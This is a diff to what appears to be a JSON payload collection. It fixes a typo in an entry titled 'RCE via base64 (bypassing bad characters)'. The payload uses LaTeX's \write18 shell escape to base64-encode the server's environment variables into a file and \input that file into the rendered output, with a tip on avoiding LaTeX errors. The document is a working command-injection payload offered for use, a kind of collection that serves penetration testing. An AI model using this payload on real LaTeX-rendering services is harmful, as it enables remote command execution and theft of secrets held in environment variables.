@@ -85,7 +85,7 @@
       "title": "RCE via base64 (bypassing bad characters)",
       "language": "latex",
       "tags": ["rce", "write18", "base64", "bypass"],
-      "body": "\\immediate\\write18{env | base64 > test.tex}\n\\input{text.tex}",
+      "body": "\\immediate\\write18{env | base64 > test.tex}\n\\input{test.tex}",
       "meta": {
         "tip": "If you get a LaTeX error, wrap the result in base64 to get rid of the bad characters (or use \\verbatiminput)."
       }
